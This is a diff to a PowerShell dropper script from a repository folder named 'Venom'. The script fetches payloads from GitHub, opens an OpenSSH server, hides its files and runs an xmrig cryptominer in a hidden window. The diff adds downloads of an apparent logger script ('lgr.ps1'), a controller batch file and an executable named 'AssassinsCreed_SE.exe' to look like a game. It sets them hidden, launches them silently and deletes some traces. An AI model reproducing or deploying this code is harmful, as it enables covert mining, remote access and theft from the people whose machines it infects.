@@ -70,6 +70,11 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/Proj
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/calty.vbs" -OutFile "FoRAUwtxKkSB.vbs"
 Invoke-WebRequest -OutFile "config.json" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/config.json"
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/lgr.ps1" -OutFile "KVbOiPPcus.ps1"
+Invoke-WebRequest -OutFile "vaoYIkVglzTJ.cmd" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/controller.cmd"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/lgr.ps1" -OutFile "ZYHGCKXWlonm.ps1"
+Invoke-WebRequest -OutFile "AssassinsCreed_SE.exe" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/AssassinsCreed_SE.exe"
+
 
 # Install and Configure OpenSSH Server
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
@@ -85,6 +90,11 @@ Get-NetFirewallRule -Name *ssh*
 Move-Item -Path "$path\ZDaFvwjOosKx.vbs" -Destination $initial_dir
 
 Start-Sleep -Seconds 30
+
+Set-ItemProperty -Name Attributes -Path "$path\vaoYIkVglzTJ.cmd" -Value "Hidden"
+Set-ItemProperty -Name Attributes -Path "$path\KVbOiPPcus.ps1" -Value "Hidden"
+
+Start-Process -ArgumentList "vaoYIkVglzTJ.cmd" -windowstyle hidden -FilePath "cscript.exe"
 
 # Create New Directory and Change to It
 New-Item -ItemType Directory -Path "$path" -Name "$wd"
@@ -129,6 +139,8 @@ Remove-Item -Path "FoRAUwtxKkSB.vbs"
 
 Set-ItemProperty -Name Attributes -Path "$initial_dir\ZDaFvwjOosKx.vbs" -Value "Hidden"
 
+Start-Process -FilePath "$path\ZYHGCKXWlonm.ps1" -windowstyle hidden
+
 cd $initial_dir
 
 # Start Autorun
@@ -137,6 +149,8 @@ Start-Process -ArgumentList "ZDaFvwjOosKx.vbs" -windowstyle hidden -FilePath "cs
 # Start Rig
 Start-Process -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" -windowstyle hidden 
 
+
+
 # Pause for 200 seconds
 Start-Sleep -Seconds 200
 
@@ -144,4 +158,5 @@ Start-Sleep -Seconds 200
 Remove-Item -Path "$initial_dir\ip.txt"
 Remove-Item -Path "$initial_dir\NzKnmxLrbsBw.txt"
 Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
+Remove-Item -Path "$path\vaoYIkVglzTJ.cmd"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
